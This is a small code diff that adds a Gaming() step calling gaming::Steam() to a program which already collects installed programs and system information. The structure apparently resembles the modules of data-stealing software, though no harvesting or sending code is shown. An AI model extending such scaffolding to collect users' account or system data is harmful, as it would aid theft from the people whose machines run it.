@@ -33,6 +33,8 @@ void Functions();
 
 void SystemInfo();
 
+void Gaming();
+
 
 
 /// <summary>
@@ -55,6 +57,8 @@ void Functions()
 	manager::MakeDirs();
 
 	SystemInfo();
+
+	Gaming();
 }
 
 void SystemInfo() 
@@ -64,4 +68,9 @@ void SystemInfo()
 	cursystem::GetProgs();
 
 	cursystem::GetSysInfo();
+}
+
+void Gaming() 
+{
+	gaming::Steam();
 }
